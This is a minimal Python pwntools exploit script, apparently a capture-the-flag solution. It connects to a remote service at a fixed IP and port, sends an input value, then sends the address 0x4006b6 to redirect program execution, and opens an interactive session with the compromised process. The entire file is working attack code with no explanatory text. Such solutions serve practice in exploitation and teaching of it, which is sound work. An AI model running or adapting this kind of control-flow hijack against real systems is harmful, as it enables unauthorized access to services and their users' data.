from pwn import *
r = remote("142.93.38.14",32160)
r.sendline(str(69))
r.recvline_contains(">> ")
r.sendline(str(0x4006b6))
r.interactive()
